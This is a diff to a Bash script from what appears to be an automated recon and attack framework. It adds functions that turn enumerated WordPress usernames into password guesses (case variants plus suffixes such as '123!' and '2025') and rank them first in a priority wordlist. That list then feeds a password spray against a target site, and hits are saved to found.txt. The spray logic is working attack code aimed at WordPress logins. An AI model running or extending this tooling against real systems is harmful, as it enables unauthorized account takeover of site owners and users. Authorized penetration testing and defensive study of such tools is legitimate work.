@@ -1247,6 +1247,68 @@ _wp_brute_build_attack_wordlist() {
     [[ -s "$dest" ]]
 }
 
+# High-hit username suffixes only (not 1..123456 — too large for priority spray).
+_wp_brute_add_username_passwords() {
+    local dest="$1"
+    local users_csv="$2"
+    local user lower cap upper variant pwd suf
+    local -a suffixes=(
+        1 12 123 '123!' '123@' 1234 '1234$' 12345 123456 '123#'
+        '1!' '12!' 2024 2025 2026
+    )
+
+    [[ -n "$users_csv" && -n "$dest" ]] || return 0
+
+    local -a user_arr=() variants=() seen_variants=()
+    IFS=',' read -ra user_arr <<<"$users_csv"
+    for user in "${user_arr[@]}"; do
+        user="${user#"${user%%[![:space:]]*}"}"
+        user="${user%"${user##*[![:space:]]}"}"
+        [[ -z "$user" ]] && continue
+        (( ${#user} >= 3 && ${#user} <= 64 )) || continue
+
+        variants=("$user")
+        lower=$(printf '%s' "$user" | tr '[:upper:]' '[:lower:]')
+        [[ "$lower" != "$user" ]] && variants+=("$lower")
+        cap="${lower^}"
+        [[ "$cap" != "$user" && "$cap" != "$lower" ]] && variants+=("$cap")
+        upper=$(printf '%s' "$user" | tr '[:lower:]' '[:upper:]')
+        [[ "$upper" != "$user" && "$upper" != "$lower" && "$upper" != "$cap" ]] && variants+=("$upper")
+
+        seen_variants=()
+        for variant in "${variants[@]}"; do
+            [[ -z "$variant" ]] && continue
+            [[ " ${seen_variants[*]} " == *" $variant "* ]] && continue
+            seen_variants+=("$variant")
+            printf '%s\n' "$variant" >>"$dest"
+            for suf in "${suffixes[@]}"; do
+                pwd="${variant}${suf}"
+                (( ${#pwd} <= 64 )) && printf '%s\n' "$pwd" >>"$dest"
+            done
+        done
+    done
+}
+
+# Priority list per target: username-as-password variants first, then short list + osint leaks.
+# Usage: _wp_brute_build_priority_wordlist <dest> <base_wordlist> <users_csv>
+_wp_brute_build_priority_wordlist() {
+    local dest="$1"
+    local base_wordlist="$2"
+    local users_csv="$3"
+    local tmp_users=".tmp/wp_brute_user_passwords.txt"
+
+    [[ -s "$base_wordlist" ]] || return 1
+
+    : >"$tmp_users"
+    _wp_brute_add_username_passwords "$tmp_users" "$users_csv"
+
+    : >"$dest"
+    [[ -s "$tmp_users" ]] && cat "$tmp_users" >>"$dest"
+    cat "$base_wordlist" >>"$dest"
+    awk 'NF && !seen[$0]++' "$dest" >"${dest}.tmp" 2>/dev/null && mv "${dest}.tmp" "$dest"
+    [[ -s "$dest" ]]
+}
+
 # Spray: merged short+osint passwords first, then wp-brute-pro smart wordlist generation.
 _wp_brute_run_hybrid_spray() {
     local target_url="$1"
@@ -1339,7 +1401,7 @@ function wp_brute_pro() {
 
         start_func "${FUNCNAME[0]}" "WordPress recon/brute (wp-brute-pro)"
 
-        local target_url users_csv company_name host_key out_dir summary_file attack_wordlist scan_json_rel
+        local target_url users_csv company_name host_key out_dir summary_file attack_wordlist priority_wordlist scan_json_rel
         : >"vulns/wp_brute/summary.txt"
         summary_file="vulns/wp_brute/summary.txt"
 
@@ -1393,10 +1455,16 @@ function wp_brute_pro() {
                 "$target_url" "$users_csv" "$wp_version" "$xmlrpc_status" "$waf_name" \
                 | anew -q "$summary_file"
 
-            local wordlist_count
-            wordlist_count=$(wc -l <"$attack_wordlist" | tr -d ' ')
-            _print_msg INFO "Running: wp-brute hybrid spray on ${target_url} (${wordlist_count} priority passwords + smart generation, users: ${users_csv})"
-            _wp_brute_run_hybrid_spray "$target_url" "$out_dir" "$attack_wordlist" "$company_name" "$users_csv" >>"$LOGFILE" 2>&1 || true
+            local wordlist_count user_pw_count
+            priority_wordlist=".tmp/wp_brute_priority_${host_key}.txt"
+            if ! _wp_brute_build_priority_wordlist "$priority_wordlist" "$attack_wordlist" "$users_csv"; then
+                priority_wordlist="$attack_wordlist"
+            fi
+            wordlist_count=$(wc -l <"$priority_wordlist" | tr -d ' ')
+            user_pw_count=$(wc -l <".tmp/wp_brute_user_passwords.txt" 2>/dev/null | tr -d ' ')
+            [[ -z "$user_pw_count" ]] && user_pw_count=0
+            _print_msg INFO "Running: wp-brute hybrid spray on ${target_url} (${wordlist_count} priority passwords incl. ${user_pw_count} username-as-pass variants, + smart generation, users: ${users_csv})"
+            _wp_brute_run_hybrid_spray "$target_url" "$out_dir" "$priority_wordlist" "$company_name" "$users_csv" >>"$LOGFILE" 2>&1 || true
 
             if [[ -s "${out_dir}/found.txt" ]]; then
                 cat "${out_dir}/found.txt" | anew -q "vulns/wp_brute/found.txt"
